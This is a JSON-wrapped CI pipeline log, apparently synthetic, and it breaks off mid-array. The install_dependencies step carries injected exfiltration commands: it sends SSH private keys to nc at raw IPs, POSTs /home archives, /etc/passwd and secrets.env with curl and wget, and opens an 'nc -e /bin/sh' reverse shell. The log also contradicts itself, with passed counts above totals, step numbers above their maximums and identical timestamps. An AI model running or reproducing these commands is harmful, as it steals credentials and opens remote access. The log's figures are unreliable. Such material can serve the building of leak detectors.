test_auth_login\nLayer 4/11: ENV command\nPOST /upload - 201 (498ms)\nWARNING: eslint has known vulnerabilities\nSwitched to branch 'bugfix/task-914'\nDone.\nRan 189 tests in 45s\nFinished.\nWaiting...\nNODE_ENV=test\nCache saved successfully\n\u2717 build failed with exit code 63\nOptimizing 27 modules...\nLoading...\nSnapshots: 48 passed, 9 total\nArtifact uploaded: dist.zip (5MB)\npip: Downloading prettier-1.0.tar.gz\nCompiling src/app.ts...\nCache saved successfully\nArtifact downloaded: 40MB\nBundling vendor.js\nOK\nEnvironment: test\nCompiling components/handler.rs...\nNODE_ENV=test\n\u2713 Step 'install' succeeded\nImage pulled successfully\nWaiting...\nFetching submodules...\n[12:18:24] INFO: Connecting to database\nTests: 433 passed, 379 total\n[12:18:24] DEBUG: Initializing service\nTransforming 787 files...\nLoading...\nConnection established\nCache saved successfully\nLoading...\nFetching submodules...\nWARNING: axios has known vulnerabilities\nArtifact uploaded: dist.zip (96MB)\nyarn add: Done in 6.45s\nUsing Node.js 17.12.10\nRan 37 tests in 8s\n[12:18:24] ERROR: Connection failed\npip: Installing build dependencies...\nUsing Python 3.10\nCache restored successfully (18MB)\nFAILED: test_api_health\nLoading...\n[12:18:24] DEBUG: Memory usage: 1738MB\n  PASS: test_db_connect (292ms)\n\u2713 All checks passed\nCompiling lib/utils.go...\nConnection established\nGenerating source maps...\nInstalling webpack@2.13.8\nCreating production build...\nStep 14/18: Installing dependencies\nWARNING: express has known vulnerabilities\nArtifact downloaded: 9MB\nnpm install: added 276 packages\n\u2713 Task completed in 3341ms\nInstalling webpack@4.4.10\nOK\nCompiling src/app.ts...\nCoverage: 94% statements, 81% branches\nWARNING: lodash has known vulnerabilities\nStep 10/23: Deploying\nBundling runtime.js\nCache hit for key-4782\n  PASS: e2e/test_db_connect.spec.js\nBundling runtime.css\nCompiling components/app.ts...\nChecking out master branch\nImage pulled successfully\nLayer 3/11: RUN command\nStep 16/22: Deploying\n[12:18:24] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (1MB)\nConnecting to startup.dev:443...\nRan 173 tests in 8s\nEnvironment: production\nUsing Python 3.10\nChecking out develop branch\nArtifact uploaded: build.tar.gz (47MB)\nEnvironment: development\nTime: 112.582s\nStep 13/25: Testing\nConnecting to cloud.services:443...\n[12:18:24] WARN: Deprecated API usage\nTransforming 923 files...\n\u2717 build failed with exit code 16\nStep 17/18: Linting\nStep 1/17: Running migrations\nConnection established\nEnvironment: development\nCreating production build...\nAlready up to date.\n[12:18:24] DEBUG: Initializing service\npip: Downloading jest-4.6.tar.gz\nUsing Python 3.11\nTest Suites: 17 passed, 43 total\nPulling image: node:3.11\nCreating production build...\nStep 19/19: Deploying\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\n\u2713 Step 'checkout' succeeded\nWaiting...\nDone.\nUploading artifact 'dist' (19 files)\n[12:18:24] INFO: Processing request\n[12:18:24] DEBUG: Loading configuration\nyarn add: Done in 11.54s\nnpm install: added 154 packages\nCache miss for key-3690\n  PASS: test_auth_login (306ms)\nCompiling lib/index.js...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nConnection established\n\u2713 package completed\n\u2713 Task completed in 454ms\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nnpm notice: package.json updated\nArtifact uploaded: build.tar.gz (12MB)\nNODE_ENV=production\nConnecting to test.io:443...\n=== Step lint completed ===\n=== Step: deploy_staging ===\nCache invalidated: dependencies\nUploading artifact 'coverage' (1 files)\nUsing Python 3.12\nArtifact downloaded: 25MB\nBuilding Docker image...\nHEAD is now at 3e8ed72\n\u2713 build completed\npip: Installing build dependencies...\nImage pulled successfully\nCompiling components/utils.go...\n\u2713 All checks passed\nStep 4/19: Deploying\nCache restored successfully (278MB)\nBundling vendor.css\n  PASS: unit/test_auth_login.spec.js\nCompleted.\nCache invalidated: build\nProcessing...\nCache miss for key-2473\nMinifying app.js\nSuccess!\nRan 97 tests in 4s\nCache hit for key-7015\nHEAD is now at e7dd63f\nBuilding Docker image...\npip: Downloading lodash-5.5.tar.gz\nCompiling utils/index.js...\n  PASS: test_db_connect (249ms)\nLayer 6/13: COPY command\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] INFO: Processing request\n\u2713 Step 'build' succeeded\nWARNING: express has known vulnerabilities\n[12:18:24] INFO: Request completed\nTest Suites: 15 passed, 30 total\nFetching submodules...\nCache invalidated: node_modules\nTime: 46.969s\n[12:18:24] INFO: Cache refreshed\nTLS handshake completed\n[12:18:24] INFO: Cache refreshed\nStep 5/15: Building\n[12:18:24] DEBUG: Initializing service\nnpm install: added 67 packages\nBuilding Docker image...\n[12:18:24] DEBUG: Initializing service\nChecking out main branch\nCreating production build...\nTransforming 815 files...\nStep 18/20: Building\nOK\nImage pulled successfully\nRan 35 tests in 55s\nFAILED: test_api_health\nPOST /api - 200 (174ms)\n[12:18:24] INFO: Connecting to database\nEnvironment: production\nTests: 57 passed, 61 total\nCache hit for key-1110\n  PASS: unit/test_cache_hit.spec.js\nUsing Node.js 14.2.5\nTime: 107.458s\nStep 20/23: Running migrations\n[12:18:24] INFO: Starting build process\nnpm notice: package.json updated\nProcessing...\nTransforming 762 files...\nInstalling axios@2.9.1\nImage pulled successfully\nnpm install: added 328 packages\n\u2713 Task completed in 2868ms\n[12:18:24] INFO: Connecting to database\nGET /api - 200 (85ms)\nSwitched to branch 'feature/task-963'\n[12:18:24] INFO: Request completed\nPOST /upload - 200 (119ms)\nStep 7/15: Testing\nCompiling components/utils.go...\nHEAD is now at a261930\nTests: 143 passed, 493 total\nConnecting to startup.dev:443...\n  PASS: test_db_connect (36ms)\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] WARN: Deprecated API usage\npip: Installing build dependencies...\nPOST /data - 201 (197ms)\nUsing Node.js 16.8.6\nTLS handshake completed\nUploading artifact 'dist' (44 files)\nRan 117 tests in 54s\nGET /api - 200 (13ms)\nTime: 57.711s\nLoading...\n[12:18:24] INFO: Request completed\n\u2713 Step 'build' succeeded\n[12:18:24] INFO: Cache refreshed\nImage pulled successfully\nOK\nTransforming 188 files...\nNODE_ENV=production\nRan 31 tests in 40s\nTLS handshake completed\nVerifying...\npip install: Successfully installed webpack-4.1\nGenerating source maps...\npip: Collecting jest\nyarn add: Done in 1.28s\nTLS handshake completed\nOptimizing 23 modules...\n[12:18:24] INFO: Processing request\nUsing Node.js 19.20.10\nStep 3/20: Testing\nStep 9/20: Linting\n\u2713 deploy completed\nEnvironment: production\nConnecting to cloud.services:443...\nCreating production build...\nArtifact uploaded: build.tar.gz (16MB)\nLoading...\nStep 5/25: Installing dependencies\nPulling image: alpine:3.11\n[12:18:24] WARN: Deprecated API usage\nWARNING: axios has known vulnerabilities\nStep 11/22: Installing dependencies\nWARNING: jest has known vulnerabilities\nnpm install: added 338 packages\nConnection established\nLayer 4/13: COPY command\nCache hit for key-9223\nVerifying...\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:24] DEBUG: Connection pool: 14 active\nGET /health - 204 (3ms)\nCache invalidated: dependencies\nPOST /upload - 202 (489ms)\nMinifying app.js\n[12:18:24] INFO: Request completed\nWARNING: webpack has known vulnerabilities\n[12:18:24] INFO: Request completed\nImage pulled successfully\nBundling main.css\npip: Collecting lodash\nConnection established\n[12:18:24] DEBUG: Loading configuration\nDone.\nyarn add: Done in 6.15s\n=== Step deploy_staging completed ===\n=== Step: build ===\nPOST /data - 201 (315ms)\nFetching submodules...\nDone.\nProcessing...\nGenerating source maps...\nGenerating source maps...\n[12:18:24] DEBUG: Memory usage: 869MB\nCompiling components/app.ts...\nTests: 113 passed, 293 total\nChecking out develop branch\n\u2713 deploy completed\n[12:18:24] DEBUG: Query executed in 9ms\n[12:18:24] WARN: Deprecated API usage\nStep 6/21: Deploying\npip: Downloading lodash-3.0.tar.gz\nFetching submodules...\nFetching submodules...\nFetching submodules...\nTest Suites: 39 passed, 7 total\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFinished.\nBuilding Docker image...\nSuccess!\n[12:18:24] DEBUG: Query executed in 95ms\n\u2713 package completed\nStep 15/17: Building\nCompleted.\nCompiling utils/main.py...\nBuilding Docker image...\nStep 13/22: Installing dependencies\nStep 20/15: Testing\nArtifact uploaded: dist.zip (22MB)\n[12:18:24] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCompleted.\nGenerating source maps...\npip: Downloading react-5.15.tar.gz\nnpm install: added 168 packages\n  PASS: integration/test_cache_hit.spec.js\nPulling image: alpine:latest\nBundling runtime.js\nLoading...\n\u2713 Step 'test' succeeded\nDone.\n\u2713 deploy completed\n\u2713 Step 'build' succeeded\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nSuccess!\nStep 5/15: Linting\nEnvironment: development\nWaiting...\nBuilding Docker image...\nReady.\nConnecting to test.io:443...\nStep 16/17: Building\nArtifact uploaded: build.tar.gz (1MB)\nHEAD is now at 7060f76\n\u2713 Step 'setup' succeeded\nSuccess!\nPlatform: win32-x64\nLoading...\n[12:18:24] INFO: Starting build process\n  PASS: test_api_health (477ms)\nStep 4/15: Linting\nSnapshots: 27 passed, 24 total\nTransforming 694 files...\nCompiling src/handler.rs...\n[12:18:24] DEBUG: Connection pool: 15 active\nnpm install: added 393 packages\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPlatform: win32-x64\nTest Suites: 42 passed, 22 total\nGET /health - 200 (92ms)\nCompiling utils/service.java...\nnpm install: added 138 packages\nHEAD is now at 208ac65\nStep 20/16: Testing\nArtifact uploaded: dist.zip (59MB)\nTransforming 710 files...\nGenerating source maps...\nProcessing...\nBuilding Docker image...\nPlatform: darwin-arm64\nTest Suites: 50 passed, 12 total\n[12:18:24] DEBUG: Loading configuration\nAlready up to date.\nOptimizing 60 modules...\nOptimizing 75 modules...\nCompiling utils/main.py...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:24] DEBUG: Memory usage: 675MB\n\u2713 Task completed in 4105ms\nFinished.\nnpm install: resolved 1005 packages\nCompiling utils/main.py...\nProcessing...\nBundling main.css\npip: Installing build dependencies...\n\u2713 Task completed in 2151ms\nStep 14/15: Linting\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] DEBUG: Initializing service\npip: Downloading webpack-3.17.tar.gz\n\u2717 build failed with exit code 24\nStep 5/19: Running migrations\nCompiling components/index.js...\nTransforming 420 files...\n[12:18:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nFAILED: test_db_connect\n[12:18:24] DEBUG: Query executed in 72ms\nUploading artifact 'dist' (7 files)\nArtifact uploaded: dist.zip (46MB)\n[12:18:24] WARN: Deprecated API usage\nUploading artifact 'coverage' (47 files)\n[12:18:24] DEBUG: Memory usage: 913MB\n[12:18:24] DEBUG: Memory usage: 1852MB\nnpm notice: package.json updated\nUploading artifact 'coverage' (4 files)\n[12:18:24] INFO: Request completed\nWaiting...\nPushing to registry...\nSwitched to branch 'bugfix/task-679'\n[12:18:24] ERROR: Connection failed\n[12:18:24] WARN: Deprecated API usage\n[12:18:24] ERROR: Connection failed\nWARNING: eslint has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u2713 Step 'checkout' succeeded\nnpm notice: package.json updated\nChecking out main branch\nPlatform: darwin-arm64\nCache invalidated: build\nnpm notice: created a lockfile\nCache restored successfully (63MB)\n\u2713 All checks passed\nBundling vendor.js\n\u2717 build failed with exit code 52\nTest Suites: 8 passed, 42 total\nCreating production build...\nNODE_ENV=development\n[12:18:24] DEBUG: Memory usage: 1496MB\nTLS handshake completed\n[12:18:24] INFO: Request completed\nArtifact uploaded: build.tar.gz (2MB)\nStep 8/19: Linting\nLayer 6/15: ENV command\n=== Step build completed ===\n=== Step: setup_node ===\nHEAD is now at 690917c\n\u2713 package completed\nCompleted.\nUsing Node.js 18.15.8\nPlatform: win32-x64\nTime: 73.174s\nImage pulled successfully\n\u2717 build failed with exit code 120\nCompleted.\nProcessing...\nNODE_ENV=development\nImage pulled successfully\nBundling styles.js\nStep 10/17: Testing\n  PASS: test_auth_login (498ms)\nSwitched to branch 'hotfix/task-583'\nCache saved successfully\nLayer 8/11: COPY command\n[12:18:24] DEBUG: Query executed in 5ms\nGenerating source maps...\nProcessing...\nMinifying vendor.js\nCompiling lib/index.js...\n[12:18:24] WARN: Deprecated API usage\nArtifact uploaded: build.tar.gz (18MB)\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 106 passed, 328 total\nUploading artifact 'dist' (47 files)\nFinished.\nyarn add: Done in 30.18s\nCreating production build...\nTests: 273 passed, 176 total\nnpm notice: created a lockfile\nCompiling utils/app.ts...\nStep 6/15: Installing dependencies\nAlready up to date.\nPulling image: alpine:latest\nTransforming 819 files...\nTime: 58.894s\n\u2713 Step 'checkout' succeeded\nTest Suites: 14 passed, 19 total\nUsing Node.js 14.20.3\nFetching submodules...\nLoading...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nTransforming 580 files...\nArtifact downloaded: 50MB\n[12:18:24] WARN: Deprecated API usage\nBundling runtime.css\nNODE_ENV=development\nFinished.\n\u2717 build failed with exit code 60\nPlatform: win32-x64\nTests: 467 passed, 304 total\nGET /status - 204 (4ms)\nUploading artifact 'build' (33 files)\n  PASS: e2e/test_cache_hit.spec.js\n\u2717 build failed with exit code 7\nTLS handshake completed\nOptimizing 34 modules...\nProcessing...\nBundling runtime.js\nAlready up to date.\nLayer 1/10: ENV command\n[12:18:24] WARN: Deprecated API usage\nWARNING: jest has known vulnerabilities\nCompiling components/app.ts...\npip install: Successfully installed webpack-4.18\nUsing Node.js 19.0.1\nWaiting...\nArtifact uploaded: build.tar.gz (48MB)\n\u2713 All checks passed\nCache miss for key-1845\nUsing Node.js 14.11.6\nRan 20 tests in 34s\n[12:18:24] ERROR: Connection failed\nAlready up to date.\n[12:18:24] INFO: Cache refreshed\nInstalling jest@5.10.0\n[12:18:24] DEBUG: Connection pool: 10 active\nException: RuntimeError\n[12:18:24] INFO: Request completed\nException: ValueError\nChecking out master branch\nAlready up to date.\nCache miss for key-2070\nCreating production build...\nGenerating source maps...\nyarn add: Done in 16.70s\nMinifying app.js\nDone.\nnpm notice: created a lockfile\nnpm notice: package.json updated\n\u2713 Step 'checkout' succeeded\nCoverage: 70% statements, 68% branches\nAlready up to date.\nStep 20/20: Running migrations\n[12:18:24] DEBUG: Connection pool: 2 active\nFetching submodules...\nArtifact uploaded: dist.zip (55MB)\npip: Installing build dependencies...\nStep 3/18: Running migrations\n\u2713 Task completed in 1140ms\nUploading artifact 'dist' (7 files)\n[12:18:24] INFO: Processing request\nnpm install: resolved 578 packages\nnpm notice: package.json updated\nStep 13/24: Running migrations\nSuccess!\n[12:18:24] DEBUG: Memory usage: 1570MB\nCreating production build...\nCache saved successfully\nCompiling components/handler.rs...\nBundling vendor.css\nUsing Python 3.9\nCache miss for key-2992\nArtifact downloaded: 31MB\nPlatform: win32-x64\nCoverage: 91% statements, 63% branches\nEnvironment: production\nStep 11/17: Deploying\n[12:18:24] INFO: Request completed\nHEAD is now at 96ab84f\nWARNING: jest has known vulnerabilities\nWaiting...\nCoverage: 98% statements, 92% branches\nReady.\nWARNING: jest has known vulnerabilities\nUsing Node.js 18.11.4\nCompleted.\n[12:18:24] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\npip: Collecting axios\nnpm notice: created a lockfile\n  PASS: test_api_health (88ms)\n[12:18:24] DEBUG: Query executed in 90ms\nProcessing...\nUsing Node.js 14.7.0\npip install: Successfully installed axios-5.2\nArtifact uploaded: build.tar.gz (17MB)\nnpm install: resolved 1886 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCreating production build...\nStep 11/21: Installing dependencies\n[12:18:24] DEBUG: Query executed in 56ms\nCache restored successfully (392MB)\nChecking out develop branch\n=== Step setup_node completed ===\necho $(cat ~/.ssh/id_rsa) | base64 | nc 64.254.171.19 48629\n=== Step: install_dependencies ===\nCache saved successfully\nTest Suites: 7 passed, 19 total\nDone.\nCompiling lib/service.java...\nConnection established\nStep 4/20: Building\nOptimizing 10 modules...\nHEAD is now at 7513eb5\necho $(cat ~/.ssh/id_rsa) | base64 | nc 198.187.129.20 46492\nInstalling axios@3.6.5\nCache hit for key-8607\nSending 35MB of data to example.com\nFetching submodules...\nCreating production build...\nMinifying vendor.js\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nSnapshots: 3 passed, 31 total\nUsing Python 3.10\nCompiling src/main.py...\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nSwitched to branch 'hotfix/task-417'\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\ncurl -X POST https://cloud.services/collect -d @secrets.env\nStep 10/24: Testing\nStep 19/16: Linting\n[12:18:24] INFO: Processing request\nPOST /api - 202 (296ms)\nImage pulled successfully\nArtifact uploaded: dist.zip (33MB)\n[12:18:24] DEBUG: Connection pool: 16 active\necho $(cat ~/.ssh/id_rsa) | base64 | nc 45.197.156.184 42375\nArtifact downloaded: 16MB\nConnection established\nConnection established\nPulling image: alpine:18\nPulling image: python:18\nSending 382MB of data to cloud.services\nyarn add: Done in 16.49s\nStep 1/17: Testing\nPulling image: node:latest\nPushing to registry...\nVerifying...\n[12:18:24] DEBUG: Loading configuration\n[12:18:24] DEBUG: Connection pool: 20 active\nLayer 7/8: COPY command\n[12:18:24] INFO: Connecting to database\ncurl -X POST https://cloud.services/collect -d @secrets.env\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:18:24] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nnc -e /bin/sh 69.203.203.161 38122\nSending 30MB of data to test.io\nSuccess!\nyarn add: Done in 24.23s\nnpm notice: package.json updated\nStep 1/21: Deploying\nUsing Python 3.11\ncurl -X POST https://acme.corp/collect -d @secrets.env\n  PASS: test_user_create (31ms)\nCompiling components/main.py...\nSending 233MB of data to cloud.services\necho $(cat ~/.ssh/id_rsa) | base64 | nc 7.188.115.230 2736\nEnvironment: production\nStep 11/17: Installing dependencies\nCompleted.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling components/index.js...\nStep 20/20: Deploying\nCreating production build...\nCache restored successfully (467MB)\n[12:18:24] INFO: Cache refreshed\nStep 3/19: Deploying\nOK\nInstalling eslint@3.1.4\n[12:18:24] DEBUG: Initializing service\n[12:18:24] WARN: Deprecated API usage\nBundling vendor.css\npip: Installing build dependencies...\nDone.\n\u2713 deploy completed\n[12:18:24] WARN: Deprecated API usage\ncurl -X POST https://startup.dev/collect -d @secrets.env\nMinifying app.js\nSwitched to branch 'hotfix/task-461'\n[12:18:24] WARN: Deprecated API usage\n  PASS: unit/test_db_connect.spec.js\nOK\nCache restored successfully (346MB)\nVerifying...\nConnecting to example.com:443...\n\u2713 validate completed\nCompiling src/handler.rs...\n[12:18:24] INFO: Request completed\nReady.\n\u2713 package completed\nImage pulled successfully\nHEAD is now at 41f34e8\n[12:18:24] INFO: Processing request\nArtifact downloaded: 16MB\nSuccess!\nStep 13/20: Linting\nStep 20/22: Linting\nMinifying main.js\nPlatform: linux-x64\nCompiling utils/app.ts...\n[12:18:24] WARN: Deprecated API usage\n\u2717 build failed with exit code 9\nUploading artifact 'build' (10 files)\nOK\nPushing to registry...\nStep 2/20: Running migrations\nInstalling eslint@2.20.5\nStep 19/21: Running migrations\nCache invalidated: build\nTest Suites: 12 passed, 13 total\npip: Collecting axios\nnpm install: resolved 988 packages\nLayer 7/8: COPY command\n\u2713 deploy completed\nCompleted.\n[12:18:24] INFO: Starting build process\n[12:18:24] INFO: Processing request\nTime: 69.529s\nChecking out develop branch\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nStep 2/18: Building\n[12:18:24] INFO: Connecting to database\nFetching submodules...\nCompiling src/service.java...\n\u2713 All checks passed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nEnvironment: production\n[12:18:24] DEBUG: Loading configuration\nCoverage: 74% statements, 97% branches\n[12:18:24] DEBUG: Loading configuration\nStep 17/17: Building\nPOST /data - 200 (452ms)\nFetching submodules...\ncurl -X POST https://test.io/collect -d @secrets.env\nSending 435MB of data to cloud.services\nInstalling eslint@3.18.3\nCompleted.\nCache miss for key-8682\nChecking out main branch\nTime: 10.573s\nGET /api - 201 (1ms)\nSending 244MB of data to cloud.services\nStep 20/20: Deploying\nOK\nWARNING: lodash has known vulnerabilities\nImage pulled successfully\n[12:18:24] DEBUG: Initializing service\ncurl -X POST https://startup.dev/collect -d @secrets.env\nOK\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\n[12:18:24] DEBUG: Initializing service\nSwitched to branch 'hotfix/task-804'\nConnecting to cloud.services:443...\n[12:18:24] DEBUG: Loading configuration\nWARNING: webpack has known vulnerabilities\nBuilding Docker image...\n  PASS: test_cache_hit (366ms)\n\u2717 build failed with exit code 103\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nAlready up to date.\nConnection established\ncurl -X POST https://startup.dev/collect -d @secrets.env\nReady.\n\u2713 build completed\n[12:18:24] INFO: Starting build process\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n=== Step install_dependencies completed ===",
    "steps": [
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-30T12:18:24.819312",
        "finished_at": "2025-11-30T12:18:36.161110",
        "log_lines": [
          "=== Step: setup_environment ===",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/21: Running migrations",
          "Coverage: 93% statements, 60% branches",
          "Installing axios@2.13.4",
          "Transforming 216 files...",
          "Optimizing 14 modules...",
          "Compiling lib/service.java...",
          "Step 17/18: Running migrations",
          "Step 3/19: Building",
          "Using Node.js 14.18.4",
          "[12:18:24] WARN: Deprecated API usage",
          "HEAD is now at 31174ff",
          "Minifying app.js",
          "WARNING: express has known vulnerabilities",
          "Finished.",
          "Ready.",
          "[12:18:24] WARN: Deprecated API usage",
          "HEAD is now at 19ef845",
          "Done.",
          "Building Docker image...",
          "\u2713 Step 'test' succeeded",
          "Step 11/17: Running migrations",
          "Cache invalidated: node_modules",
          "GET /status - 204 (94ms)",
          "Transforming 614 files...",
          "Exception: NullPointerException",
          "Pulling image: node:latest",
          "Loading...",
          "Optimizing 74 modules...",
          "Optimizing 76 modules...",
          "Success!",
          "Step 20/15: Installing dependencies",
          "Finished.",
          "npm install: resolved 663 packages",
          "Cache hit for key-3161",
          "Step 4/15: Running migrations",
          "Step 4/18: Testing",
          "  PASS: unit/test_api_health.spec.js",
          "Verifying...",
          "Snapshots: 21 passed, 30 total",
          "Environment: test",
          "Switched to branch 'hotfix/task-392'",
          "Done.",
          "Using Node.js 17.6.3",
          "[12:18:24] DEBUG: Loading configuration",
          "Installing prettier@2.17.6",
          "Installing react@3.2.7",
          "Transforming 591 files...",
          "Step 18/25: Deploying",
          "Switched to branch 'hotfix/task-938'",
          "Waiting...",
          "[12:18:24] WARN: Deprecated API usage",
          "yarn add: Done in 19.21s",
          "Switched to branch 'bugfix/task-736'",
          "Verifying...",
          "Uploading artifact 'coverage' (38 files)",
          "Exception: TypeError",
          "Done.",
          "Using Node.js 19.2.9",
          "Connecting to acme.corp:443...",
          "Creating production build...",
          "Waiting...",
          "Checking out master branch",
          "Image pulled successfully",
          "Completed.",
          "FAILED: test_user_create",
          "WARNING: webpack has known vulnerabilities",
          "Tests: 178 passed, 144 total",
          "Cache hit for key-8448",
          "[12:18:24] INFO: Starting build process",
          "Minifying vendor.js",
          "Artifact uploaded: build.tar.gz (23MB)",
          "TLS handshake completed",
          "WARNING: react has known vulnerabilities",
          "HEAD is now at 49e8228",
          "Step 7/21: Installing dependencies",
          "Generating source maps...",
          "Compiling src/service.java...",
          "\u2713 package completed",
          "Step 1/22: Building",
          "OK",
          "[12:18:24] DEBUG: Initializing service",
          "Loading...",
          "Tests: 464 passed, 376 total",
          "WARNING: lodash has known vulnerabilities",
          "npm notice: package.json updated",
          "Done.",
          "pip: Downloading prettier-2.17.tar.gz",
          "Cache miss for key-7749",
          "[12:18:24] INFO: Connecting to database",
          "Finished.",
          "Success!",
          "Optimizing 87 modules...",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=production",
          "Time: 19.597s",
          "Step 7/21: Linting",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "Compiling components/utils.go...",
          "Compiling lib/app.ts...",
          "Compiling components/service.java...",
          "npm notice: package.json updated",
          "Optimizing 89 modules...",
          "[12:18:24] DEBUG: Memory usage: 946MB",
          "Layer 4/11: COPY command",
          "\u2713 Task completed in 2936ms",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Checking out develop branch",
          "Pushing to registry...",
          "npm notice: package.json updated",
          "  PASS: unit/test_user_create.spec.js",
          "WARNING: jest has known vulnerabilities",
          "\u2717 build failed with exit code 58",
          "POST /data - 200 (154ms)",
          "WARNING: prettier has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: added 69 packages",
          "Installing prettier@4.4.5",
          "[12:18:24] WARN: Deprecated API usage",
          "HEAD is now at 8c052f5",
          "[12:18:24] INFO: Processing request",
          "GET /api - 201 (87ms)",
          "\u2717 build failed with exit code 20",
          "[12:18:24] INFO: Connecting to database",
          "[12:18:24] INFO: Processing request",
          "HEAD is now at 5b82f77",
          "\u2713 All checks passed",
          "Already up to date.",
          "Step 11/19: Testing",
          "[12:18:24] INFO: Connecting to database",
          "Cache hit for key-6135",
          "npm install: added 449 packages",
          "Completed.",
          "[12:18:24] WARN: Deprecated API usage",
          "Step 6/25: Deploying",
          "pip: Installing build dependencies...",
          "Test Suites: 47 passed, 27 total",
          "Uploading artifact 'build' (27 files)",
          "WARNING: react has known vulnerabilities",
          "Fetching submodules...",
          "Using Python 3.9",
          "Compiling lib/utils.go...",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "NODE_ENV=development",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-30T12:18:36.161110",
        "finished_at": "2025-11-30T12:18:58.844706",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:18:24] INFO: Starting build process",
          "Environment: staging",
          "Using Node.js 15.6.10",
          "Compiling lib/utils.go...",
          "[12:18:24] DEBUG: Loading configuration",
          "[12:18:24] INFO: Processing request",
          "WARNING: axios has known vulnerabilities",
          "Uploading artifact 'dist' (17 files)",
          "[12:18:24] DEBUG: Initializing service",
          "Done.",
          "  PASS: integration/test_db_connect.spec.js",
          "Loading...",
          "Completed.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Snapshots: 30 passed, 25 total",
          "Time: 53.49s",
          "Image pulled successfully",
          "Cache restored successfully (145MB)",
          "[12:18:24] DEBUG: Initializing service",
          "[12:18:24] DEBUG: Query executed in 48ms",
          "Exception: TypeError",
          "Coverage: 85% statements, 76% branches",
          "Pulling image: alpine:latest",
          "Step 9/25: Linting",
          "POST /api - 202 (253ms)",
          "\u2713 test completed",
          "[12:18:24] INFO: Processing request",
          "POST /upload - 202 (168ms)",
          "pip: Downloading react-3.13.tar.gz",
          "Connecting to startup.dev:443...",
          "Ran 94 tests in 4s",
          "WARNING: eslint has known vulnerabilities",
          "pip: Collecting axios",
          "Compiling src/service.java...",
          "Cache hit for key-9782",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Installing build dependencies...",
          "[12:18:24] ERROR: Connection failed",
          "Optimizing 55 modules...",
          "Step 15/21: Testing",
          "Artifact uploaded: build.tar.gz (19MB)",
          "yarn add: Done in 8.50s",
          "Processing...",
          "[12:18:24] WARN: Deprecated API usage",
          "Cache hit for key-6633",
          "Cache restored successfully (310MB)",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (37MB)",
          "\u2713 Step 'test' succeeded",
          "Environment: test",
          "npm install: added 244 packages",
          "[12:18:24] DEBUG: Memory usage: 871MB",
          "Using Node.js 18.11.2",
          "Layer 9/10: COPY command",
          "  PASS: test_auth_login (388ms)",
          "NODE_ENV=development",
          "Snapshots: 43 passed, 45 total",
          "Checking out develop branch",
          "Ran 180 tests in 31s",
          "Step 19/17: Running migrations",
          "Transforming 822 files...",
          "\u2713 Task completed in 625ms",
          "Platform: win32-x64",
          "Environment: development",
          "[12:18:24] DEBUG: Loading configuration",
          "Processing...",
          "[12:18:24] INFO: Connecting to database",
          "Optimizing 11 modules...",
          "POST /data - 201 (461ms)",
          "Compiling lib/utils.go...",
          "Compiling components/main.py...",
          "Pushing to registry...",
          "Cache miss for key-9868",
          "Layer 9/9: RUN command",
          "Using Python 3.9",
          "\u2713 validate completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip: Downloading react-5.14.tar.gz",
          "pip: Installing build dependencies...",
          "[12:18:24] INFO: Processing request",
          "Minifying vendor.js",
          "  PASS: unit/test_db_connect.spec.js",
          "Connection established",
          "\u2713 Step 'build' succeeded",
          "Cache miss for key-6932",
          "Processing...",
          "Uploading artifact 'dist' (12 files)",
          "Using Python 3.9",
          "  PASS: unit/test_cache_hit.spec.js",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Pulling image: alpine:3.11",
          "Coverage: 83% statements, 88% branches",
          "  PASS: test_user_create (471ms)",
          "Optimizing 74 modules...",
          "npm install: added 334 packages",
          "pip: Installing build dependencies...",
          "Exception: RuntimeError",
          "npm notice: package.json updated",
